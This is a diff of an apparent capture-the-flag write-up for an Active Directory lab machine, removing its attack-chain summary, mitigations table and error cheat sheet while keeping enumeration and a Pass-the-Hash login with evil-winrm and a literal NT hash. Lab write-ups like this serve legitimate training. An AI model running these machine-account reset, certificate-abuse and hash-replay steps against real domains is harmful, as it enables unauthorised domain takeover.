@@ -24,32 +24,14 @@ recover its NT hash, and log in via **Pass-the-Hash** for full domain compromise
 
 ---
 
-## Attack chain
-
-```
-Guest (anonymous SMB)
-   └─ shares + RID brute
-trainee:trainee (weak shared password)
-   └─ Notes share → user flag + hint about the old machine account
-BANKING$ (pre-created machine account, password = "banking")
-   └─ password reset → valid login → member of Domain Computers
-AD CS ESC1 (template RetroClients)
-   └─ certificate as Administrator → NT hash
-Pass-the-Hash (Evil-WinRM)
-   └─ retro\administrator → root flag
-```
-
----
-
 ## Enumeration
 
 ### Nmap
 
-Fast open-port scan, then a targeted service/script scan on those ports:
+Full port scan:
 
 ```bash
-ports=$(nmap --open 10.129.234.44 | grep open | cut -d ' ' -f 1 | cut -d '/' -f 1 | paste -sd,)
-nmap 10.129.234.44 -p $ports -sV -sC -Pn --disable-arp-ping
+nmap -p- --min-rate=5000 -T4 10.129.234.44
 ```
 
 A classic Domain Controller footprint:
@@ -258,26 +240,3 @@ evil-winrm -u Administrator -H 252fac7066d93dd009d4fd2cd0368389 -i retro.vl
 ```
 
 **Root flag:** `C:\Users\Administrator\Desktop\root.txt`.
-
----
-
-## Mitigations
-
-| Weakness | Mitigation |
-|---|---|
-| Anonymous SMB / enumeration (Guest) | Disable the Guest account; restrict null/guest sessions and RID cycling |
-| Shared / weak password (`trainee`) | Enforce strong, unique passwords + MFA; audit shared accounts |
-| Pre-created machine account (`BANKING$`) | Remove unused pre-created accounts; never leave password = name; rotate secrets |
-| AD CS **ESC1** (`RetroClients`) | Remove "enrollee supplies subject", limit enrollment rights, require Manager approval; enforce KB5014754 |
-| Pass-the-Hash | Tier model / Protected Users; LAPS; rotate the Administrator account |
-
-## Appendix — error cheat sheet
-
-| Error | Meaning | Action |
-|---|---|---|
-| `NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` | Password correct, but machine account needs a reset | `impacket-changepasswd … -p rpc-samr` |
-| `changepasswd.py: not found` | apt Impacket uses the `impacket-` prefix | `impacket-changepasswd …` |
-| `NETBIOS connection timed out` | VPN instability | Re-run the command |
-| `Object SID mismatch` | KB5014754 validates the cert SID | Re-request with `-sid <domain>-500` |
-| `KDC_ERR_PADATA_TYPE_NOSUPP` | PKINIT (skew / negotiation) | `ntpdate retro.vl`; or `-ldap-shell` (Schannel) |
-| `KRB_AP_ERR_SKEW` | Clock out of sync | `sudo ntpdate retro.vl` |
